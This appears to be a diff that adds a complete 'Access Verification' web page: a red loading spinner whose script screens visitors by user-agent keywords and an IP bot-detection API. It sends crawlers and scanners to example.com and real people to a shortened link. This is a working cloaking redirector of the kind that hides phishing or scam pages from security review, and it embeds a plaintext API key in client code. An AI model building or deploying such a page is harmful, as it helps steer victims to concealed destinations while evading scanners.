@@ -1,0 +1,147 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Access Verification</title>
+  <meta name="robots" content="index,follow">
+  <style>
+    :root{
+      --bg: #ffffff;
+      --accent: #E50914;
+    }
+    * { box-sizing: border-box; }
+    html, body { height: 100%; margin: 0; }
+    body {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: var(--bg);
+      font-family: system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+      color: #222;
+    }
+
+    /* Center container */
+    .container {
+      display:flex;
+      flex-direction:column;
+      align-items:center;
+      gap:12px;
+      width:100%;
+      padding:20px;
+      max-width:720px;
+    }
+
+    /* RED SPINNER */
+    .spinner {
+      width:16vmin;
+      height:16vmin;
+      max-width:120px;
+      max-height:120px;
+      min-width:44px;
+      min-height:44px;
+      border:5px solid rgba(229,9,20,0.14);
+      border-top:5px solid var(--accent);
+      border-radius:50%;
+      animation: spin 900ms linear infinite;
+      box-shadow: 0 6px 18px rgba(229,9,20,0.08);
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    .message {
+      font-size: clamp(13px, 2.2vw, 16px);
+      color: #333;
+      text-align: center;
+    }
+
+    @media (max-width:420px) {
+      .spinner { width:22vmin; height:22vmin; }
+    }
+
+    /* Hidden element for screen readers / accessibility */
+    .visually-hidden {
+      position: absolute !important;
+      height: 1px; width: 1px;
+      overflow: hidden; clip: rect(1px, 1px, 1px, 1px);
+      white-space: nowrap; border: 0; padding: 0; margin: -1px;
+    }
+  </style>
+</head>
+<body>
+  <main class="container" role="main" aria-live="polite">
+    <div class="spinner" aria-hidden="true"></div>
+    <div class="message" id="status">Loading...</div>
+
+    <noscript>
+      <div class="message">Loading...</div>
+    </noscript>
+  </main>
+
+  <script>
+    // CONFIGURATION
+    // Plain API key (as requested)
+    const API_KEY = "5cf58aab-6325-4057-a00e-ab1576f2b732";
+    const API_BASE = "https://api.ipdetective.io";
+    const DEST_HUMAN = "https://o2o.to/i/495DRG";
+    const DEST_BOT = "https://example.com/";
+
+    // Minimal UA heuristic for obvious bots (optional)
+    function uaLooksLikeBot(ua) {
+      if (!ua) return false;
+      const test = ua.toLowerCase();
+      const signatures = [
+        "bot","crawler","spider","curl","wget","headless","phantom",
+        "fetch","scanner","bingpreview","facebookexternalhit"
+      ];
+      return signatures.some(s => test.includes(s));
+    }
+
+    (async function() {
+      const statusEl = document.getElementById('status');
+
+      // Early user-agent check
+      const ua = navigator.userAgent || "";
+      if (uaLooksLikeBot(ua)) {
+        statusEl.textContent = "Loading...";
+        // Immediate redirect for bots (no delay)
+        window.location.replace(DEST_BOT);
+        return;
+      }
+
+      statusEl.textContent = "Loading...";
+
+      try {
+        const response = await fetch(`${API_BASE}/ip?info=true`, {
+          method: "GET",
+          headers: {
+            "Accept": "application/json",
+            "x-api-key": API_KEY
+          },
+          cache: "no-store",
+          referrerPolicy: "no-referrer"
+        });
+
+        if (!response.ok) {
+          throw new Error(response.status + " " + response.statusText);
+        }
+
+        const data = await response.json();
+        const isBot = (typeof data.bot === "boolean") ? data.bot : false;
+
+        statusEl.textContent = "Loading...";
+        // Immediate redirect based on result
+        if (isBot) {
+          window.location.replace(DEST_BOT);
+        } else {
+          window.location.replace(DEST_HUMAN);
+        }
+
+      } catch (err) {
+        console.error("Verification error:", err);
+        statusEl.textContent = "Loading...";
+        window.location.replace(DEST_HUMAN);
+      }
+    })();
+  </script>
+</body>
+</html>
